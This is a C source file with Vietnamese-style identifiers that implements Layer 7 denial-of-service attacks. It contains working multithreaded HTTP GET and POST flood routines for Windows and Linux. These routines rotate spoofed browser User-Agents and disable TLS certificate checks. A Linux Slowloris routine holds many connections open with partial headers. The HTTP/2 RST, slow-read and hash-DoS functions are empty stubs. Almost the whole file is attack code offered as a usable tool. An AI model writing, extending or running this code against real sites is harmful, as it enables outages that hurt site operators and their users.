/**
 * ddos_layer7.c
 * Trien khai cac ham DDoS Layer 7 (HTTP/HTTPS)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <winhttp.h>
    #define THREAD_HANDLE HANDLE
    #define THREAD_RETURN DWORD WINAPI
    #define THREAD_PARAM LPVOID
    #define SLEEP_MS(x) Sleep(x)
    #define THREAD_CREATE(h, f, p) *h = CreateThread(NULL, 0, f, p, 0, NULL)
    #define THREAD_JOIN(h) WaitForSingleObject(h, INFINITE)
    #define THREAD_EXIT return 0
    #pragma comment(lib, "winhttp.lib")
#else
    #include <unistd.h>
    #include <pthread.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>
    #define THREAD_HANDLE pthread_t
    #define THREAD_RETURN void*
    #define THREAD_PARAM void*
    #define SLEEP_MS(x) usleep((x) * 1000)
    #define THREAD_CREATE(h, f, p) pthread_create(h, NULL, f, p)
    #define THREAD_JOIN(h) pthread_join(h, NULL)
    #define THREAD_EXIT return NULL
#endif

#include "ddos_layer7.h"

/* Mac dinh User-Agents */
static const char* USER_AGENTS_MAC_DINH[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    NULL
};

/* Cau truc tham so cho thread */
typedef struct {
    char url[2048];
    char muc_tieu[256];
    int cong;
    int thoi_gian;
    int dung_proxy;
    const char** danh_sach_ua;
    volatile int* dem_request;
    volatile int* dang_chay;
} ThamSoThread;

#ifdef _WIN32
/* ==================== WINDOWS HTTP ==================== */

static THREAD_RETURN thread_get_flood(THREAD_PARAM param) {
    ThamSoThread* ts = (ThamSoThread*)param;
    HINTERNET session = WinHttpOpen(L"Mozilla/5.0", 
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, 
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (session == NULL) THREAD_EXIT;
    
    WinHttpSetTimeouts(session, 5000, 5000, 5000, 5000);
    
    /* Parse URL */
    wchar_t wide_url[2048];
    MultiByteToWideChar(CP_UTF8, 0, ts->url, -1, wide_url, 2048);
    
    URL_COMPONENTS url_comp;
    ZeroMemory(&url_comp, sizeof(url_comp));
    url_comp.dwStructSize = sizeof(url_comp);
    
    wchar_t hostname[256] = {0};
    wchar_t url_path[1024] = {0};
    url_comp.lpszHostName = hostname;
    url_comp.dwHostNameLength = 256;
    url_comp.lpszUrlPath = url_path;
    url_comp.dwUrlPathLength = 1024;
    
    if (!WinHttpCrackUrl(wide_url, 0, 0, &url_comp)) {
        WinHttpCloseHandle(session);
        THREAD_EXIT;
    }
    
    DWORD flags = (url_comp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    
    time_t thoi_gian_bat_dau = time(NULL);
    
    while (*(ts->dang_chay)) {
        if (ts->thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= ts->thoi_gian) break;
        
        HINTERNET connect = WinHttpConnect(session, hostname, url_comp.nPort, 0);
        if (connect == NULL) {
            SLEEP_MS(10);
            continue;
        }
        
        HINTERNET request = WinHttpOpenRequest(connect, L"GET", url_path,
                                                NULL, WINHTTP_NO_REFERER,
                                                WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
        if (request == NULL) {
            WinHttpCloseHandle(connect);
            SLEEP_MS(10);
            continue;
        }
        
        /* Bo qua loi chung chi */
        if (flags & WINHTTP_FLAG_SECURE) {
            DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                              SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
            WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
        }
        
        /* Chon User-Agent ngau nhien */
        if (ts->danh_sach_ua != NULL) {
            int count = 0;
            while (ts->danh_sach_ua[count] != NULL) count++;
            if (count > 0) {
                int idx = rand() % count;
                wchar_t wide_ua[512];
                MultiByteToWideChar(CP_UTF8, 0, ts->danh_sach_ua[idx], -1, wide_ua, 512);
                
                wchar_t headers[1024];
                swprintf(headers, 1024, L"User-Agent: %s\r\nAccept: */*\r\nCache-Control: no-cache\r\n", wide_ua);
                
                WinHttpSendRequest(request, headers, wcslen(headers),
                                  WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
            }
        }
        
        if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                               WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            WinHttpCloseHandle(request);
            WinHttpCloseHandle(connect);
            continue;
        }
        
        WinHttpReceiveResponse(request, NULL);
        
        /* Doc va bo qua response */
        char buffer[1024];
        DWORD bytes_doc;
        while (WinHttpReadData(request, buffer, sizeof(buffer), &bytes_doc)) {
            if (bytes_doc == 0) break;
        }
        
        (*(ts->dem_request))++;
        
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
    }
    
    WinHttpCloseHandle(session);
    THREAD_EXIT;
}

/**
 * HTTP GET Flood chinh (Windows)
 */
int http_get_flood(const char* url, int so_thread, int thoi_gian,
                   const char** danh_sach_user_agent, int dung_proxy) {
    volatile int dem_request = 0;
    volatile int dang_chay = 1;
    
    ThamSoThread ts;
    strncpy(ts.url, url, sizeof(ts.url) - 1);
    ts.thoi_gian = thoi_gian;
    ts.dung_proxy = dung_proxy;
    ts.danh_sach_ua = (danh_sach_user_agent != NULL) ? danh_sach_user_agent : USER_AGENTS_MAC_DINH;
    ts.dem_request = &dem_request;
    ts.dang_chay = &dang_chay;
    
    HANDLE* threads = (HANDLE*)malloc(sizeof(HANDLE) * so_thread);
    if (threads == NULL) return 0;
    
    for (int i = 0; i < so_thread; i++) {
        THREAD_CREATE(&threads[i], thread_get_flood, &ts);
    }
    
    /* Cho thoi gian hoac cho den khi stop */
    if (thoi_gian > 0) {
        SLEEP_MS(thoi_gian * 1000);
    } else {
        SLEEP_MS(60000); /* Mac dinh 60 giay */
    }
    
    dang_chay = 0;
    
    for (int i = 0; i < so_thread; i++) {
        WaitForSingleObject(threads[i], 3000);
        CloseHandle(threads[i]);
    }
    
    free(threads);
    return dem_request;
}

/**
 * HTTP POST Flood (Windows)
 */
int http_post_flood(const char* url, const char* body, int so_thread, int thoi_gian) {
    /* Tuong tu GET flood nhung su dung POST method */
    volatile int dem_request = 0;
    volatile int dang_chay = 1;
    int tong_request = 0;
    
    /* Gioi han thoi gian */
    time_t thoi_gian_bat_dau = time(NULL);
    
    while (dang_chay) {
        if (thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= thoi_gian) break;
        
        HINTERNET session = WinHttpOpen(L"Mozilla/5.0",
                                         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                         WINHTTP_NO_PROXY_NAME,
                                         WINHTTP_NO_PROXY_BYPASS, 0);
        if (session == NULL) continue;
        
        /* Parse URL */
        wchar_t wide_url[2048];
        MultiByteToWideChar(CP_UTF8, 0, url, -1, wide_url, 2048);
        
        URL_COMPONENTS url_comp;
        ZeroMemory(&url_comp, sizeof(url_comp));
        url_comp.dwStructSize = sizeof(url_comp);
        wchar_t hostname[256] = {0};
        wchar_t url_path[1024] = {0};
        url_comp.lpszHostName = hostname;
        url_comp.dwHostNameLength = 256;
        url_comp.lpszUrlPath = url_path;
        url_comp.dwUrlPathLength = 1024;
        
        if (!WinHttpCrackUrl(wide_url, 0, 0, &url_comp)) {
            WinHttpCloseHandle(session);
            continue;
        }
        
        DWORD flags = (url_comp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET connect = WinHttpConnect(session, hostname, url_comp.nPort, 0);
        if (connect == NULL) {
            WinHttpCloseHandle(session);
            continue;
        }
        
        HINTERNET request = WinHttpOpenRequest(connect, L"POST", url_path,
                                                NULL, WINHTTP_NO_REFERER,
                                                WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
        if (request == NULL) {
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            continue;
        }
        
        if (flags & WINHTTP_FLAG_SECURE) {
            DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                              SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
            WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
        }
        
        wchar_t headers[] = L"Content-Type: application/x-www-form-urlencoded\r\n";
        DWORD body_len = (DWORD)strlen(body);
        
        WinHttpSendRequest(request, headers, wcslen(headers),
                          (LPVOID)body, body_len, body_len, 0);
        WinHttpReceiveResponse(request, NULL);
        
        char buffer[1024];
        DWORD bytes_doc;
        while (WinHttpReadData(request, buffer, sizeof(buffer), &bytes_doc)) {
            if (bytes_doc == 0) break;
        }
        
        tong_request++;
        
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
    }
    
    return tong_request;
}

/**
 * Slowloris Attack (Windows)
 */
int slowloris_attack(const char* muc_tieu, int cong, int so_socket, int thoi_gian) {
    /* Slowloris can mo nhieu socket, kho thuc hien voi WinHTTP */
    /* Tra ve stub - se duoc trien khai voi raw socket */
    (void)muc_tieu;
    (void)cong;
    (void)so_socket;
    (void)thoi_gian;
    return 0;
}

int http2_rst_attack(const char* muc_tieu, int so_thread, int thoi_gian) {
    (void)muc_tieu;
    (void)so_thread;
    (void)thoi_gian;
    return 0;
}

int slow_read_attack(const char* url, int so_thread, int thoi_gian) {
    (void)url;
    (void)so_thread;
    (void)thoi_gian;
    return 0;
}

int hash_dos_attack(const char* url, int so_thread, int thoi_gian) {
    (void)url;
    (void)so_thread;
    (void)thoi_gian;
    return 0;
}

#else
/* ==================== LINUX/MACOS HTTP ==================== */

/**
 * HTTP GET Flood thread (Linux/MacOS)
 */
static THREAD_RETURN thread_get_flood(THREAD_PARAM param) {
    ThamSoThread* ts = (ThamSoThread*)param;
    
    /* Phan giai DNS truoc */
    char hostname[256];
    int port = 80;
    int use_ssl = 0;
    
    /* Parse URL don gian */
    const char* url_ptr = ts->url;
    if (strncmp(url_ptr, "https://", 8) == 0) {
        url_ptr += 8;
        port = 443;
        use_ssl = 1;
    } else if (strncmp(url_ptr, "http://", 7) == 0) {
        url_ptr += 7;
    }
    
    const char* slash = strchr(url_ptr, '/');
    if (slash != NULL) {
        size_t host_len = slash - url_ptr;
        strncpy(hostname, url_ptr, host_len);
        hostname[host_len] = '\0';
    } else {
        strncpy(hostname, url_ptr, sizeof(hostname) - 1);
    }
    
    /* Phan giai DNS */
    struct addrinfo hints, *result;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    char ip[64] = {0};
    int ret = getaddrinfo(hostname, NULL, &hints, &result);
    if (ret == 0) {
        struct sockaddr_in* addr = (struct sockaddr_in*)result->ai_addr;
        inet_ntop(AF_INET, &(addr->sin_addr), ip, sizeof(ip));
        freeaddrinfo(result);
    } else {
        THREAD_EXIT;
    }
    
    time_t thoi_gian_bat_dau = time(NULL);
    
    while (*(ts->dang_chay)) {
        if (ts->thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= ts->thoi_gian) break;
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            SLEEP_MS(50);
            continue;
        }
        
        /* Dat timeout */
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sock);
            SLEEP_MS(50);
            continue;
        }
        
        /* Tao HTTP request */
        char request[4096];
        const char* path = (slash != NULL) ? slash : "/";
        
        /* Chon User-Agent ngau nhien */
        const char* ua = "Mozilla/5.0";
        if (ts->danh_sach_ua != NULL) {
            int count = 0;
            while (ts->danh_sach_ua[count] != NULL) count++;
            if (count > 0) {
                ua = ts->danh_sach_ua[rand() % count];
            }
        }
        
        snprintf(request, sizeof(request),
                 "GET %s HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "User-Agent: %s\r\n"
                 "Accept: */*\r\n"
                 "Cache-Control: no-cache\r\n"
                 "Connection: close\r\n"
                 "\r\n",
                 path, hostname, ua);
        
        send(sock, request, strlen(request), 0);
        
        /* Doc response (bo qua) */
        char buffer[1024];
        while (recv(sock, buffer, sizeof(buffer), 0) > 0) {
            /* Doc het */
        }
        
        (*(ts->dem_request))++;
        close(sock);
    }
    
    THREAD_EXIT;
}

/**
 * HTTP GET Flood chinh (Linux/MacOS)
 */
int http_get_flood(const char* url, int so_thread, int thoi_gian,
                   const char** danh_sach_user_agent, int dung_proxy) {
    (void)dung_proxy;
    
    volatile int dem_request = 0;
    volatile int dang_chay = 1;
    
    ThamSoThread ts;
    strncpy(ts.url, url, sizeof(ts.url) - 1);
    ts.thoi_gian = thoi_gian;
    ts.danh_sach_ua = (danh_sach_user_agent != NULL) ? danh_sach_user_agent : USER_AGENTS_MAC_DINH;
    ts.dem_request = &dem_request;
    ts.dang_chay = &dang_chay;
    
    pthread_t* threads = (pthread_t*)malloc(sizeof(pthread_t) * so_thread);
    if (threads == NULL) return 0;
    
    for (int i = 0; i < so_thread; i++) {
        pthread_create(&threads[i], NULL, thread_get_flood, &ts);
    }
    
    if (thoi_gian > 0) {
        sleep(thoi_gian);
    } else {
        sleep(60);
    }
    
    dang_chay = 0;
    
    for (int i = 0; i < so_thread; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    return dem_request;
}

/**
 * HTTP POST Flood (Linux/MacOS)
 */
int http_post_flood(const char* url, const char* body, int so_thread, int thoi_gian) {
    volatile int dem_request = 0;
    volatile int dang_chay = 1;
    
    /* Phan giai DNS */
    char hostname[256];
    int port = 80;
    int use_ssl = 0;
    
    const char* url_ptr = url;
    if (strncmp(url_ptr, "https://", 8) == 0) {
        url_ptr += 8;
        port = 443;
        use_ssl = 1;
    } else if (strncmp(url_ptr, "http://", 7) == 0) {
        url_ptr += 7;
    }
    
    const char* slash = strchr(url_ptr, '/');
    if (slash != NULL) {
        size_t host_len = slash - url_ptr;
        strncpy(hostname, url_ptr, host_len);
        hostname[host_len] = '\0';
    } else {
        strncpy(hostname, url_ptr, sizeof(hostname) - 1);
    }
    
    char ip[64] = {0};
    struct addrinfo hints, *result;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(hostname, NULL, &hints, &result) == 0) {
        struct sockaddr_in* addr = (struct sockaddr_in*)result->ai_addr;
        inet_ntop(AF_INET, &(addr->sin_addr), ip, sizeof(ip));
        freeaddrinfo(result);
    }
    
    if (strlen(ip) == 0) return 0;
    
    time_t thoi_gian_bat_dau = time(NULL);
    const char* path = (slash != NULL) ? slash : "/";
    size_t body_len = strlen(body);
    
    while (dang_chay) {
        if (thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= thoi_gian) break;
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        char request[8192];
        snprintf(request, sizeof(request),
                 "POST %s HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "User-Agent: Mozilla/5.0\r\n"
                 "Content-Type: application/x-www-form-urlencoded\r\n"
                 "Content-Length: %zu\r\n"
                 "Connection: close\r\n"
                 "\r\n"
                 "%s",
                 path, hostname, body_len, body);
        
        send(sock, request, strlen(request), 0);
        
        char buffer[1024];
        while (recv(sock, buffer, sizeof(buffer), 0) > 0) {}
        
        dem_request++;
        close(sock);
    }
    
    return dem_request;
}

/**
 * Slowloris Attack (Linux/MacOS)
 */
int slowloris_attack(const char* muc_tieu, int cong, int so_socket, int thoi_gian) {
    /* Tao nhieu ket noi va gui header cham */
    int* sockets = (int*)malloc(sizeof(int) * so_socket);
    int so_ket_noi_thanh_cong = 0;
    
    if (sockets == NULL) return 0;
    
    for (int i = 0; i < so_socket; i++) {
        sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (sockets[i] < 0) continue;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(cong);
        
        struct hostent* he = gethostbyname(muc_tieu);
        if (he == NULL) {
            close(sockets[i]);
            continue;
        }
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
        
        /* Dat socket non-blocking */
        fcntl(sockets[i], F_SETFL, O_NONBLOCK);
        
        connect(sockets[i], (struct sockaddr*)&addr, sizeof(addr));
        
        /* Gui mot phan header */
        char partial_header[256];
        snprintf(partial_header, sizeof(partial_header),
                 "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n", muc_tieu);
        send(sockets[i], partial_header, strlen(partial_header), MSG_NOSIGNAL);
        
        so_ket_noi_thanh_cong++;
    }
    
    /* Duy tri ket noi */
    time_t thoi_gian_bat_dau = time(NULL);
    while ((time(NULL) - thoi_gian_bat_dau) < thoi_gian) {
        for (int i = 0; i < so_socket; i++) {
            if (sockets[i] > 0) {
                /* Gui them header gia de giu ket noi */
                char keep_alive[] = "X-Keep-Alive: 1\r\n";
                send(sockets[i], keep_alive, strlen(keep_alive), MSG_NOSIGNAL);
            }
        }
        sleep(10 + rand() % 20);
    }
    
    /* Dong tat ca ket noi */
    for (int i = 0; i < so_socket; i++) {
        if (sockets[i] > 0) close(sockets[i]);
    }
    
    free(sockets);
    return so_ket_noi_thanh_cong;
}

int http2_rst_attack(const char* muc_tieu, int so_thread, int thoi_gian) {
    (void)muc_tieu;
    (void)so_thread;
    (void)thoi_gian;
    return 0;
}

int slow_read_attack(const char* url, int so_thread, int thoi_gian) {
    (void)url;
    (void)so_thread;
    (void)thoi_gian;
    return 0;
}

int hash_dos_attack(const char* url, int so_thread, int thoi_gian) {
    (void)url;
    (void)so_thread;
    (void)thoi_gian;
    return 0;
}

#endif